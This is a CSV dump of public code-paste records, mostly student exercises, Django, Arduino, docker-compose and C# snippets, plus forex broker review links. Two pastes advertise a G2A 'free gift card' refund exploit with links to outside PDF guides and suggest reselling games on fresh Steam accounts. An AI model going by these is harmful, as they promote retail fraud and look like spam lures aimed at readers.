id,title,username,language,date,content
u7m18Bib,Untitled,Farz0l1x,Python,Wednesday 27th of March 2024 07:04:55 AM CDT,"file = open('16.txt')
s = file.readline()
s = s.replace('CSGO', '****').replace('PC', '**')
for i in range(len(s)):
    if s[i] != '*':
        s = s.replace(s[i], ' ')
s = s.split()
print(len(max(s, key = len)))"
1T57xdkE,data878,TestGuy1,JSON,Wednesday 27th of March 2024 07:00:06 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'c226e66b5da936b8ca152e4da0686f60fe3d0bea0b089ca90f7c244b003fe805e422bd19fe56dc7d2b8a965b0d2d1721dbd191f5b64d854955cdb9f715b00f42f505acd4b15bd886869d6aacdef01a96744d7205ac0b4eb4fff901801b96adae1f5d6f187c7aff7423f30fffdacb9e766803c8b1c72a80604a08852406b4a268',
  otherdata: [
    '2f4630f4c7d14b9e7aa0ab51dda4bab0',
    '4df96d82f04a2dc1a852c6b4655e9e45',
    '9021a356e999329242511198c90473d5',
    '9ccb0e02cb9563b507cdce3038bdde97',
    'a59b8dd466dcba3daa14dacb5a556bfe',
    'aff7fdb224804870d93feed144d0be1c',
    '7be9d5874def59c7a5b52bb9c361ee6c',
    '92fc3a53394c176837d289d258c5ba1f'
  ]
}"
xGLvDSPN,Review Hantec Markets,fxvnpro,PHP,Wednesday 27th of March 2024 06:50:26 AM CDT,https://www.fxvnpro.com/review-hantec-markets/
192BxJiB,Review Hantec Markets,reviewbrokers,PHP,Wednesday 27th of March 2024 06:49:42 AM CDT,https://www.reviewbrokers.net/review-hantec-markets/
V9NGRBjj,Untitled,Davide1505,Python,Wednesday 27th of March 2024 06:41:51 AM CDT,"import re
from PyPDF2 import PdfReader, PdfWriter

# Definisci l'espressione regolare per il codice fiscale italiano
cf_regex = r'[A-Z]{6}\d{2}[ABCDEHLMPRST]\d{2}[A-Z]\d{3}[A-Z]'

# Funzione per estrarre i codici fiscali dal testo
def trova_codici_fiscali(testo):
    return re.findall(cf_regex, testo)

# Leggi il PDF
pdf_path = 'percorso/del/tuo/file.pdf'
reader = PdfReader(pdf_path)

# Inizializza una mappa per tracciare le pagine per ogni dipendente
pagine_per_dipendente = {}
ultimo_codice_fiscale_trovato = None

# Estrai il testo da ogni pagina e determina l'appartenenza dei dipendenti
for numero_pagina in range(len(reader.pages)):
    pagina = reader.pages[numero_pagina]
    testo = pagina.extract_text() if pagina else """"
    codici_trovati = trova_codici_fiscali(testo)
    
    if codici_trovati:
        # Considera solo il primo codice fiscale trovato per pagina
        codice_fiscale_trovato = codici_trovati[0]
        print(f""Codice fiscale trovato: {codice_fiscale_trovato}"")
        
        # Se √® un nuovo dipendente, inizia a tracciare le sue pagine
        if codice_fiscale_trovato != ultimo_codice_fiscale_trovato:
            ultimo_codice_fiscale_trovato = codice_fiscale_trovato
            pagine_per_dipendente[codice_fiscale_trovato] = []
        
        pagine_per_dipendente[ultimo_codice_fiscale_trovato].append(pagina)
    else:
        print(f""Nessun codice fiscale trovato nella pagina {numero_pagina + 1}, potrebbe essere necessario un controllo manuale."")

# Crea e salva un PDF per ogni dipendente trovato
for codice_fiscale, pagine in pagine_per_dipendente.items():
    writer = PdfWriter()
    for pagina in pagine:
        writer.add_page(pagina)
    
    nome_file = f'{codice_fiscale}.pdf'
    with open(nome_file, 'wb') as nuovo_pdf:
        writer.write(nuovo_pdf)
    print(f""File salvato: {nome_file}"")"
9jSdE4u3,Replace field image_url in new model,horozov86,Python,Wednesday 27th of March 2024 06:28:53 AM CDT,"1. –°—ä–∑–¥–∞–≤–∞–º –Ω–æ–≤ –º–æ–¥–µ–ª Image –≤ –∫–æ–π—Ç–æ –¥–µ—Ñ–∏–Ω–∏—Ä–∞–º–µ image_url. –ú–æ–≥–∞ –¥–∞ –¥–æ–±–∞–≤—è –∏ –¥–æ–ø—ä–ª–Ω–∏—Ç–µ–ª–Ω–∞ –ª–æ–≥–∏–∫–∞ –∑–∞ —Å–Ω–∏–º–∫–∞—Ç–∞, –∫–∞—Ç–æ created-at, modified_at, size –∏ –¥—Ä. –í –º–æ–¥–µ–ª–∞ Place –¥–æ–±–∞–≤—è–º–µ image, –∫–æ–µ—Ç–æ –µ —Å–≤—ä—Ä–∑–∞–Ω–æ —Å –º–æ–¥–µ–ª–∞ Image —á—Ä–µ–∑ ForeignKey. –ò–∑—Ç—Ä–∏–≤–∞–º–µ image-url –æ—Ç Place.

from django.db import models
from django.contrib.auth import get_user_model

UserModel = get_user_model()

class Image(models.Model):
    image_url = models.URLField(
        unique=True,
        default=""https://..."",
        error_messages={
            'unique': ""This image URL is already in use! Provide a new one.""
        }
    )
    # –ú–æ–∂–µ—Ç–µ –¥–∞ –¥–æ–±–∞–≤–∏—Ç–µ –æ—â–µ –ø–æ–ª–µ—Ç–∞ —Å–ø–æ—Ä–µ–¥ –Ω—É–∂–¥–∏—Ç–µ —Å–∏, –∫–∞—Ç–æ –Ω–∞–ø—Ä–∏–º–µ—Ä –ø–æ–ª–µ –∑–∞ –æ–ø–∏—Å–∞–Ω–∏–µ –Ω–∞ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ—Ç–æ –∏–ª–∏ –∑–∞ –∫–∞—Ç–µ–≥–æ—Ä–∏—è—Ç–∞ –º—É.

class Place(models.Model):
    RATING_CHOICES = [
        (1, '1 Star'),
        (2, '2 Stars'),
        (3, '3 Stars'),
        (4, '4 Stars'),
        (5, '5 Stars'),
    ]

    CATEGORY_CHOICES = [
        ('Mountain', 'Mountain'),
        ('Sea', 'Sea'),
        ('Historical Site', 'Historical Site'),
        ('City', 'City'),
        ('Spa', 'Spa'),
        ('Wine Tourism', 'Wine Tourism')

    ]
    name = models.CharField(
        max_length=200,
        null=False,
        blank=False,
    )
    description = models.TextField(
        null=False,
        blank=False,
    )
    location = models.CharField(
        max_length=200,
        null=False,
        blank=False,
    )
    rating = models.IntegerField(
        choices=RATING_CHOICES,
        null=True,
        blank=True,
    )

    category = models.CharField(max_length=100, choices=CATEGORY_CHOICES, null=True, blank=True)

    user = models.ForeignKey(UserModel, on_delete=models.RESTRICT)
    image = models.ForeignKey(Image, on_delete=models.CASCADE, null=True, blank=True)

2. –ü—Ä–æ–º–µ–Ω—è–º–µ —Ñ–æ—Ä–º–∞—Ç–∞, –∫–∞—Ç–æ –∑–∞–º–µ–Ω—è–º–µ –ø–æ–ª–µ—Ç–æ image-url —Å image.

from django import forms
from my_holiday.destination.models import Place

class PlaceBaseForm(forms.ModelForm):
    class Meta:
        model = Place
        fields = ['name', 'description', 'location', 'rating', 'image', 'category',]

class PlaceCreateForm(PlaceBaseForm):
    pass

class PlaceDetailsForm(PlaceBaseForm):
    pass

class PlaceEditForm(PlaceBaseForm):
    pass

–ù–ï –°–™–ú –°–ò–ì–£–†–ï–ù –î–ê–õ–ò –©–ï –†–ê–ë–û–¢–ò –ó–ê–¢–û–í–ê –©–ï –¢–ï–°–¢–í–ê–ú –í –ö–û–ü–ò–ï –ù–ê –ü–†–û–ï–ö–¢–ê –í–™–†–ó–ê–ù –ö–™–ú –ù–û–í–ê –ë–ê–ó–ê.

"
2ipyXEQh,ü§ë G2A.com Free Gift Card Guide Mar 2024 FIX ü§ë,ounnuo,GetText,Wednesday 27th of March 2024 06:25:49 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

If you use this make sure to use the English version of G2A.com otherwise this will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_688765.pdf

Working as of:
27 March 2024


















"
602xkbZc,Review FXFlat,reviewbrokers,PHP,Wednesday 27th of March 2024 06:15:37 AM CDT,https://www.reviewbrokers.net/review-fxflat/
PJX57fbq,server rain thing,DanielKrastev-bit,C,Wednesday 27th of March 2024 05:57:17 AM CDT,"#include <Servo.h>

Servo myServo;  // Create a servo object to control a servo

int servoPin = 9;  // Pin connected to the servo
int sensorPin = A0;  // Pin connected to the FC-37 sensor
int waterLevel;  // Variable to store the water level reading

void setup() {
  myServo.attach(servoPin);  // Attach the servo to the pin
  Serial.begin(9600);  // Initialize serial communication for debugging
}

void loop() {
  // Read the water level from the sensor
  waterLevel = analogRead(sensorPin);
  Serial.println(waterLevel);
  if (waterLevel <= 1000 && waterLevel >= 701) {
    // Water level is low, move servo to low position
      Serial.println(""Water level: OFF"");
  } else if (waterLevel <= 700 && waterLevel >= 401) {
      myServo.write(0);
      delay(1000);
      myServo.write(180);
      delay(2000);
    Serial.println(""Water level: Low"");
  } else if (waterLevel <= 400 && waterLevel >= 251) {
      myServo.write(0);
      delay(1000);
      myServo.write(180);
      delay(1000);
    Serial.println(""Water level: Mid"");
  } else if (waterLevel <= 250) {
      myServo.write(0);
      delay(400);
      myServo.write(180);
    Serial.println(""Water level: High"");
  }

  delay(1000);  // Delay for stability
}"
gSruG4qL,l6z2,Eziox,C#,Wednesday 27th of March 2024 05:57:03 AM CDT,"using System;
using System.Collections.Generic;
using System.Text;

namespace StarWarsUniverse
{
    public enum StronaKonfliktu
    {
        REPUBLIKA,
        IMPERIUM
    }

    public class Planeta
    {
        public string Nazwa { get; }
        public uint? LiczbaKsiezycow { get; }

        public Planeta(string nazwa, uint? liczbaKsiezycow)
        {
            Nazwa = nazwa;
            LiczbaKsiezycow = liczbaKsiezycow;
        }

        public Planeta(Planeta planeta)
        {
            Nazwa = planeta.Nazwa;
            LiczbaKsiezycow = planeta.LiczbaKsiezycow;
        }

        public override string ToString()
        {
            return $""Planeta {Nazwa}, ksiƒô≈ºyce: {LiczbaKsiezycow}"";
        }
    }

    public class PostacStarWars
    {
        public string Imie { get; set; }
        public string Gatunek { get; }
        public string Plec { get; }
        public Planeta PlanetaMacierzysta { get; }
        public StronaKonfliktu StronaKonfliktu { get; set; }

        public PostacStarWars(string imie, string gatunek, string plec, Planeta planetaMacierzysta, StronaKonfliktu stronaKonfliktu)
        {
            Imie = imie;
            Gatunek = gatunek;
            Plec = plec;
            PlanetaMacierzysta = planetaMacierzysta;
            StronaKonfliktu = stronaKonfliktu;
        }

        public PostacStarWars(PostacStarWars postac) : this(postac.Imie, postac.Gatunek, postac.Plec, new Planeta(postac.PlanetaMacierzysta), postac.StronaKonfliktu)
        {
        }

        public override string ToString()
        {
            return $""Imie: {Imie}, Gatunek: {Gatunek}, Planeta Macierzysta: {PlanetaMacierzysta}, Plec: {Plec}, Strona Konfliktu: {StronaKonfliktu}"";
        }
    }

    public static class ListExtension
    {
        public static string ZwrocInfoOLiscie<T>(this List<T> lista)
        {
            StringBuilder sb = new StringBuilder();
            foreach (var item in lista)
            {
                sb.AppendLine(item.ToString());
            }
            return sb.ToString();
        }
    }

    public delegate string Wybierz(PostacStarWars c);

    public class PostacieStarWars
    {
        public List<PostacStarWars> Postacie { get; } = new List<PostacStarWars>();

        [Obsolete(""Ta metoda jest przestarza≈Ça! U≈ºyj ZwrocPostaciPo(Wybierz wybierz, string wartosc)"")]
        public List<PostacStarWars> ZwrocPostaciPoPlci(string plec)
        {
            return ZwrocPostaciPo((postac) => postac.Plec == plec, plec);
        }

        public List<PostacStarWars> ZwrocPostaciPo(Wybierz wybierz, string wartosc)
        {
            List<PostacStarWars> wynik = new List<PostacStarWars>();
            foreach (var postac in Postacie)
            {
                if (wybierz(postac) == wartosc)
                {
                    wynik.Add(new PostacStarWars(postac));
                }
            }
            return wynik;
        }

        public override string ToString()
        {
            StringBuilder sb = new StringBuilder();
            foreach (var postac in Postacie)
            {
                sb.AppendLine(postac.ToString());
            }
            return sb.ToString();
        }

        public void Dodaj(PostacStarWars postac)
        {
            Postacie.Add(postac);
        }
    }

    class Program
    {
        static void Main(string[] args)
        {
            Planeta tatooine = new Planeta(""Tatooine"", 3);
            Planeta alderaan = new Planeta(""Alderaan"", 0);
            Planeta corellia = new Planeta(""Corellia"", null); //null poniewa≈º dane sƒÖ rozbie≈ºne w r√≥≈ºnych ≈∫r√≥d≈Çach
            Planeta stewjon = new Planeta(""Stewjon"", null); // brak informacji

            PostacStarWars anakin = new PostacStarWars(""Anakin Skywalker "", ""Czlowiek"", ""Mezczyzna"", tatooine, StronaKonfliktu.REPUBLIKA);
            PostacStarWars leia = new PostacStarWars(""Leia Organa"", ""Czlowiek"", ""Kobieta"", alderaan, StronaKonfliktu.REPUBLIKA);
            PostacStarWars han = new PostacStarWars(""Han Solo"", ""Czlowiek"", ""Mezczyzna"", corellia, StronaKonfliktu.REPUBLIKA);
            PostacStarWars obiWan = new PostacStarWars(""Obi-Wan Kenobi"", ""Czlowiek"", ""Mezczyzna"", stewjon, StronaKonfliktu.REPUBLIKA);

            var postacie = new PostacieStarWars();
            postacie.Dodaj(anakin);
            postacie.Dodaj(leia);
            postacie.Dodaj(han);
            postacie.Dodaj(obiWan);

            Console.WriteLine(""Informacje o postaciach:"");
            Console.WriteLine(postacie.ToString());

            // Anakin przechodzi na stronƒô IMPERIUM
            anakin.Imie = ""Darth Vader"";
            anakin.StronaKonfliktu = StronaKonfliktu.IMPERIUM;

            Console.WriteLine(""\nPo zmianie Anakina na Darth Vadera:"");
            Console.WriteLine(postacie.ToString());

            // Correlia ma 3 ksiƒô≈ºyce
            corellia.LiczbaKsiezycow = 3;

            Console.WriteLine(""\nPo zmianie liczby ksiƒô≈ºycy Correlii na 3:"");
            Console.WriteLine(postacie.ToString());

            // G≈Çƒôboka kopia obiekt√≥w
            PostacStarWars anakinClone = new PostacStarWars(anakin);
            Console.WriteLine(""\nG≈Çƒôboka kopia obiektu Anakin:"");
            Console.WriteLine(anakinClone.ToString());

            // Zwr√≥cenie listy kobiet
            Console.WriteLine(""\nLista kobiet:"");
            List<PostacStarWars> kobiety = postacie.ZwrocPostaciPo((postac) => postac.Plec, ""Kobieta"");
            Console.WriteLine(kobiety.ZwrocInfoOLiscie());

            // Zwr√≥cenie listy ludzi
            Console.WriteLine(""\nLista ludzi:"");
            List<PostacStarWars
List<PostacStarWars> ludzie = postacie.ZwrocPostaciPo((postac) => postac.Gatunek, ""Czlowiek"");
            Console.WriteLine(ludzie.ZwrocInfoOLiscie());
        }
    }
}"
6YkbudfH,Untitled,G0nz0uk,YAML,Wednesday 27th of March 2024 05:43:47 AM CDT,"version: ""3.9""

x-environment: &oncall-environment
  DATABASE_TYPE: sqlite3
  BROKER_TYPE: redis
  BASE_URL: $DOMAIN
  SECRET_KEY: $SECRET_KEY
  FEATURE_PROMETHEUS_EXPORTER_ENABLED: ${FEATURE_PROMETHEUS_EXPORTER_ENABLED:-false}
  PROMETHEUS_EXPORTER_SECRET: ${PROMETHEUS_EXPORTER_SECRET:-}
  REDIS_URI: redis://redis:6379/0
  DJANGO_SETTINGS_MODULE: settings.hobby
  CELERY_WORKER_QUEUE: ""default,critical,long,slack,telegram,webhook,retry,celery,grafana""
  CELERY_WORKER_CONCURRENCY: ""1""
  CELERY_WORKER_MAX_TASKS_PER_CHILD: ""100""
  CELERY_WORKER_SHUTDOWN_INTERVAL: ""65m""
  CELERY_WORKER_BEAT_ENABLED: ""True""
  GRAFANA_API_URL: https://my.domain.com:3000

services:
  engine:
    image: grafana/oncall
    restart: always
    ports:
      - ""8080:8080""
    command: sh -c ""uwsgi --ini uwsgi.ini""
    environment: *oncall-environment
    volumes:
      - oncall_data:/var/lib/oncall
    depends_on:
      oncall_db_migration:
        condition: service_completed_successfully
      redis:
        condition: service_healthy

  celery:
    image: grafana/oncall
    restart: always
    command: sh -c ""./celery_with_exporter.sh""
    environment: *oncall-environment
    volumes:
      - oncall_data:/var/lib/oncall
    depends_on:
      oncall_db_migration:
        condition: service_completed_successfully
      redis:
        condition: service_healthy

  oncall_db_migration:
    image: grafana/oncall
    command: python manage.py migrate --noinput
    environment: *oncall-environment
    volumes:
      - oncall_data:/var/lib/oncall
    depends_on:
      redis:
        condition: service_healthy

  redis:
    image: redis:7.0.5
    restart: always
    expose:
      - 6379
    volumes:
      - redis_data:/data
    deploy:
      resources:
        limits:
          memory: 500m
          cpus: ""0.5""
    healthcheck:
      test: [""CMD"", ""redis-cli"", ""ping""]
      timeout: 5s
      interval: 5s
      retries: 10

#  prometheus:
#    image: prom/prometheus
#    hostname: prometheus
#    restart: always
#    ports:
#      - ""9090:9090""
#    volumes:
#      - ./prometheus.yml:/etc/prometheus/prometheus.yml
#      - prometheus_data:/prometheus
#    profiles:
#      - with_prometheus

#  grafana:
#    image: ""grafana/${GRAFANA_IMAGE:-grafana:latest}""
#    restart: always
#    ports:
#      - ""3000:3000""
#    environment:
#      GF_SECURITY_ADMIN_USER: ${GRAFANA_USER:-admin}
#      GF_SECURITY_ADMIN_PASSWORD: ${GRAFANA_PASSWORD:-admin}
#      GF_PLUGINS_ALLOW_LOADING_UNSIGNED_PLUGINS: grafana-oncall-app
#      GF_INSTALL_PLUGINS: grafana-oncall-app
#    volumes:
#      - grafana_data:/var/lib/grafana
#    deploy:
#      resources:
#        limits:
#          memory: 500m
#          cpus: ""0.5""
#    profiles:
#      - with_grafana

volumes:
#  grafana_data:
#  prometheus_data:
  oncall_data:
  redis_data:"
cJetjjh6,update forms.py  and create admin.py in app accounts,horozov86,Python,Wednesday 27th of March 2024 05:43:30 AM CDT,"App accounts:


1. In forms.py we add:

class MyHolidayUserChangeForm(auth_forms.UserChangeForm):
    class Meta(auth_forms.UserChangeForm.Meta):
        model = UserModel



2. In admin.py we add:

from django.contrib import admin
from django.contrib.auth import admin as auth_admin

from my_holiday.accounts.forms import MyHolidayUserCreationForm, MyHolidayUserChangeForm

UserModel = get_user_model()


@admin.register(UserModel)
class AppUserAdmin(auth_admin.UserAdmin):
    model = UserModel
    add_form = MyHolidayUserCreationForm
    form = MyHolidayUserChangeForm

    list_display = ('pk', 'email', 'is_staff', 'is_superuser')
    search_fields = ('email',)
    ordering = ('pk',)

    fieldsets = (
        (None, {'fields': ('email', 'password')}),
        ('Personal info', {'fields': ()}),
        ('Permissions', {'fields': ('is_active', 'is_staff', 'groups', 'user_permissions')}),
        ('Important dates', {'fields': ('last_login',)}),
    )

    add_fieldsets = (
        (
            None,
            {
                ""classes"": (""wide"",),
                ""fields"": (""email"", ""password1"", ""password2""),
            },
        ),
    )"
i0JkvCXn,Untitled,Farz0l1x,Python,Wednesday 27th of March 2024 05:24:09 AM CDT,"file = open('14.txt')
s = file.readline()
f = [1] * len(s)
for i in range(1, len(s)):
    if s[i] < s[i-1]:
        f[i] = f[i-1] + 1
print(max(f))"
t2hgtFME,Dixie,bleuderp,Linden Scripting,Wednesday 27th of March 2024 05:19:52 AM CDT,"integer channel = 1;
 
    /* PRIM_GLTF_BASE_COLOR,
    0 integer face, 1 string texture, 2 vector repeats, 3 vector offsets, 4 float rotation_in_radians,
    5 vector color, 6 float alpha, 7 integer gltf_alpha_mode, 8 float alpha_mask_cutoff, 9 integer double_sided
    */

/* Get object properties to pass into PRIM_GLTF_BASE_COLOR
-------------------------------------------------------------------*/

/*
    vector getTint(integer part, integer face){
        return llList2Vector(llGetLinkPrimitiveParams(part, [PRIM_COLOR, face]), 0);
    }
    
    integer getAlpha(integer part, integer face) {
        list params = llGetLinkPrimitiveParams(part, [PRIM_GLTF_BASE_COLOR, face]);
        return llList2Integer(params, 6);
    }
    
    integer getAlphaMode(integer part, integer face) {
        list params = llGetLinkPrimitiveParams(part, [PRIM_ALPHA_MODE, face]);
        return llList2Integer(params, 0);
    }
*/

list getFaceGTLF(integer part, integer face, string texture)
{
	list params = llGetLinkPrimitiveParams(part, [PRIM_COLOR, face, PRIM_GLTF_BASE_COLOR,
			face, PRIM_ALPHA_MODE, face]);

	vector tint = llList2Vector(params, 0);			// 2: 0 + 0
	integer alpha = llList2Integer(params, 8);		// 9: 2 + 6
	integer amode = llList2Integer(params, 11);		// 2: 11 + 0

	return [PRIM_GLTF_BASE_COLOR, face, texture, """", """", """", tint, alpha, amode, """", """"];
}
/*-----------------------------------------------------------------*/
 

default
{
    state_entry() {
        llListen(channel, """", """", """");
    }
    
    listen( integer channel, string name, key id, string msg ) {
			llOwnerSay(""listen: '"" + msg + ""'"");
            if( llGetOwnerKey(id) == llGetOwner() ) {
					llOwnerSay(""listen from owner"");

                    if ( ""off"" == msg ) {
						llOwnerSay(""listen says OFF"");
                        llSetLinkPrimitiveParams(LINK_THIS, getFaceGTLF(0, 0, ""textur"")
								+ getFaceGTLF(0, 1, ""textur"") + getFaceGTLF(0, 2, ""textur"")
                                + getFaceGTLF(0, 3, ""textur"") );
                    }
                    
                    else if ( ""on"" == msg ) {
						llOwnerSay(""listen says ON"");
                        llSetLinkPrimitiveParams(LINK_THIS, getFaceGTLF(0, 0, """")
								+ getFaceGTLF(0, 1, ""textur"") + getFaceGTLF(0, 2, ""textur"")
                                + getFaceGTLF(0, 3, ""textur"") );
                    }
            }
    }
}"
Xtc5zWL7,Untitled,Farz0l1x,Python,Wednesday 27th of March 2024 05:18:33 AM CDT,"file = open('13.txt')
s = file.readline()
s = s[:-1]
f = [1] * len(s)
for i in range(1,len(s)):
    if int(s[i]) > int(s[i-1]):
        f[i] = f[i-1] + 1
    else:
        f[i] = 1
print(max(f))"
HXmcVE9j,servo hello world,DanielKrastev-bit,C,Wednesday 27th of March 2024 05:16:27 AM CDT,"#include <Servo.h>

Servo myServo;  // Create a servo object to control a servo

int servoPin = 9;  // Pin connected to the servo

void setup() {
  myServo.attach(servoPin);  // Attach the servo to the pin
}

void loop() {
  // Move the servo to the starting position (0 degrees)
  myServo.write(0);
  delay(1000);  // Wait for 1 second
  
  // Move the servo to the middle position (90 degrees)
  myServo.write(90);
  delay(1000);  // Wait for 1 second
  
  // Move the servo to the end position (180 degrees)
  myServo.write(180);
  delay(1000);  // Wait for 1 second
  // Move the servo to the middle position (90 degrees)
  myServo.write(90);
  delay(1000);  // Wait for 1 second
}
"
zmP9HsuX,Untitled,Farz0l1x,Python,Wednesday 27th of March 2024 05:13:02 AM CDT,"file = open('12.txt')
s = file.readline()
f = [1] * len(s)
for i in range(1, len(s)):
    if s[i-1] <= s[i]:
        f[i] = f[i -1] + 1
    else:
        f[i] = 1
print(max(f))"
6V6QHT9J,Untitled,Farz0l1x,Python,Wednesday 27th of March 2024 05:06:51 AM CDT,"file = open('11.txt')
s = file.readline()
for i in 'XYZ':
    while i + i in s:
        s = s.replace(i + i, i + ' ' + i)
s = s.split()
print(len(max(s, key = len)))"
a8KvgtkT,Untitled,Farz0l1x,Python,Wednesday 27th of March 2024 05:03:42 AM CDT,"file = open('10.txt')
s = file.readline()
for i in 'NOP':
    for j in 'NOP':
        while i + j in s:
            s = s.replace(i + j, i + ' ' + j)
s = s.split()
print(len(max(s, key = len)))"
vPEG4DiY,G2A.com Free Gift Card Guide Mar 2024 FIX,HastyBasher0,GetText,Wednesday 27th of March 2024 04:54:59 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

IMPORTANT: If you use this make sure to use the English version of G2A.com otherwise this will not work!

You can buy gift cards directly with it or you can buy popular games then put them on fresh steam accounts and then sell those accounts.
 
PDF guide here:
https://smallpdf.com/file#s=cea149fd-ead1-4939-94cf-d10a8ce7936a
 
Working as of:
27 March 2024















































"
XmT7EEgF,Untitled,GreenComfyTea,C#,Wednesday 27th of March 2024 04:54:04 AM CDT,"using ImGuiNET;
using SharpPluginLoader.Core.IO;
using SharpPluginLoader.Core.Memory;
using System.Drawing;
using System.Numerics;
using System.Runtime.InteropServices;

namespace SharpPluginLoader.Core.Rendering
{
	public static class Renderer
	{
		/// <summary>
		/// Indicates whether the main SPL menu is currently shown.
		/// </summary>
		public static bool MenuShown => _showMenu;

#if DEBUG
		/// <summary>
		/// Indicates whether the ImGui demo window is currently shown.
		/// </summary>
		public static bool DemoShown => _showDemo;
#endif

		/// <summary>
		/// Indicates whether the game is currently running in DirectX 12 mode.
		/// </summary>
		public static bool IsDirectX12 { get; private set; }

		/// <summary>
		/// Loads a texture from the specified path.
		/// </summary>
		/// <param name=""path"">The path to the texture.</param>
		/// <param name=""width"">The width of the loaded texture.</param>
		/// <param name=""height"">The height of the loaded texture.</param>
		/// <returns>A handle to the loaded texture.</returns>
		/// <remarks>
		/// Textures can be any of the following formats: PNG, JPG, DDS
		/// </remarks>
		///
		/// <example>
		/// <code>
		///     var texture = Renderer.LoadTexture(""./path/to/texture.png"");
		///     if (texture == TextureHandle.Invalid)
		///         // handle error
		///     ...
		///     ImGui.Image(texture, new Vector2(100, 100));
		/// </code>
		/// </example>
		public static TextureHandle LoadTexture(string path, out uint width, out uint height)
		{
			return new TextureHandle(InternalCalls.LoadTexture(path, out width, out height));
		}

		[UnmanagedCallersOnly]
		internal static nint Initialize(Size viewportSize, Size windowSize, byte d3d12, nint menuKey)
		{
			IsDirectX12 = d3d12 != 0;

			if (menuKey != 0)
			{
				var keyStr = MemoryUtil.ReadString(menuKey);
				if (Enum.TryParse<Key>(keyStr, out var key))
				{
					_menuKey = key;
				}
				else
				{
					Log.Warn($""Invalid menu key: {keyStr}, falling back to {DefaultMenuKey}"");
				}
			}

			_viewportSize = new Vector2(viewportSize.Width, viewportSize.Height);
			_windowSize = new Vector2(windowSize.Width, windowSize.Height);
			Log.Debug($""""""
					   Initializing Renderer with
						   Viewport Size: {viewportSize.Width}x{viewportSize.Height}
						   Window Size: {windowSize.Width}x{windowSize.Height}
					   """""");

			_mousePosScalingFactor = new Vector2(
				_viewportSize.X / _windowSize.X,
				_viewportSize.Y / _windowSize.Y
			);

			if (ImGui.GetCurrentContext() != 0)
				return ImGui.GetCurrentContext();
			
			ImGui.CreateContext();
			var io = ImGui.GetIO();
			io.ConfigFlags |= ImGuiConfigFlags.DockingEnable;
			// Currently causes a freeze when dragging a window outside of the main window.
			// Most likely the WndProc doesn't process events anymore which causes windows to think it's frozen.
			// io.ConfigFlags |= ImGuiConfigFlags.ViewportsEnable;

			SetupImGuiStyle();

			var sMhMouse = SingletonManager.GetSingleton(""sMhMouse"");
			if (sMhMouse is not null)
			{
				_mouseUpdateHook = Hook.Create<MouseUpdateDelegate>(sMhMouse.GetVirtualFunction(6), m =>
				{
					// Prevent the game from doing any mouse updates if an ImGui window is focused.
					if (ImGui.GetIO().MouseDrawCursor)
						return;

					_mouseUpdateHook.Original(m);
				});
			}

			Log.Debug(""Renderer.Initialize"");

			return ImGui.GetCurrentContext();
		}

		[UnmanagedCallersOnly]
		internal static void Render()
		{
			foreach (var plugin in PluginManager.Instance.GetPlugins(p => p.OnRender))
				plugin.OnRender();
		}

		[UnmanagedCallersOnly]
		internal static unsafe nint ImGuiRender()
		{
			if(Input.IsPressed(_menuKey))
				_showMenu = !_showMenu;
			if(Input.IsPressed(_demoKey))
				_showDemo = !_showDemo;


			var io = ImGui.GetIO();
			var anyFocused = ImGui.IsWindowFocused(ImGuiFocusedFlags.AnyWindow);
			var anyHovered = ImGui.IsWindowHovered(ImGuiHoveredFlags.AnyWindow);
			io.MouseDrawCursor = anyFocused || anyHovered;
			io.DisplaySize = _viewportSize;

			if(_showMenu)
				ImGui.GetStyle().Alpha = anyFocused ? 1.0f : 0.5f;

			// Not actually implemented
			var isFontReloadRequired = false;

			foreach(var plugin in PluginManager.Instance.GetPlugins(p => p.OnPreImGuiRender))
				isFontReloadRequired = plugin.OnPreImGuiRender() || isFontReloadRequired;

			if(isFontReloadRequired)
			{
				io.Fonts.Build();

				if(IsDirectX12) ImGuiExtensions.CreateDeviceObjectsDX12();
				else ImGuiExtensions.CreateDeviceObjectsDX11();
			}

			ImGui.NewFrame();
			if(_showMenu)
			{
				if(ImGui.Begin(""SharpPluginLoader"", ref _showMenu, ImGuiWindowFlags.MenuBar))
				{
					if(ImGui.BeginMenuBar())
					{
						if(ImGui.BeginMenu(""Options""))
						{
							ImGui.Checkbox(""Draw Primitives as Wireframe"",
								ref MemoryUtil.AsRef(_renderingOptionPointers.DrawPrimitivesAsWireframe));

							ImGui.SliderFloat(""Line Thickness"",
								ref MemoryUtil.AsRef(_renderingOptionPointers.LineThickness),
								1.0f, 10.0f);

							ImGui.SliderFloat(""Font Scale"", ref io.FontGlobalScale, 0.5f, 2.0f);

							ImGui.EndMenu();
						}
						ImGui.EndMenuBar();

						if(ImGui.IsItemDeactivated())
						{
							// TODO: Save settings
						}
					}

					foreach(var plugin in PluginManager.Instance.GetPlugins(pluginData => pluginData.OnImGuiRender))
					{
						if(plugin.PluginData.ImGuiWrappedInTreeNode)
						{
							if(ImGui.TreeNodeEx(plugin.Name,
									ImGuiTreeNodeFlags.FramePadding | ImGuiTreeNodeFlags.SpanAvailWidth))
							{
								plugin.OnImGuiRender();
								ImGui.TreePop();
							}
						}
						else
						{
							plugin.OnImGuiRender();
						}
					}
				}

				ImGui.End();
			}

			foreach(var plugin in PluginManager.Instance.GetPlugins(p => p.OnImGuiFreeRender))
				plugin.OnImGuiFreeRender();

#if DEBUG
		if (_showDemo)
			ImGui.ShowDemoWindow(ref _showDemo);
#endif

			ImGui.PushStyleVar(ImGuiStyleVar.WindowRounding, 5f);
			InternalCalls.RenderNotifications();
			ImGui.PopStyleVar();

			ImGui.EndFrame();
			ImGui.Render();

			return (nint) ImGui.GetDrawData().NativePtr;
		}

		internal static void Shutdown()
		{
			ImGui.DestroyContext();
			Log.Debug(""Renderer.Shutdown"");
		}

		[UnmanagedCallersOnly]
		internal static unsafe void SetRenderingOptions(RenderingOptionPointers* pointers)
		{
			_renderingOptionPointers = *pointers;
		}

		private static void SetupImGuiStyle()
		{
			var style = ImGui.GetStyle();

			style.Alpha = 1.0f;
			style.DisabledAlpha = 1.0f;
			style.WindowPadding = new Vector2(12.0f, 12.0f);
			style.WindowRounding = 2.0f;
			style.WindowBorderSize = 1.0f;
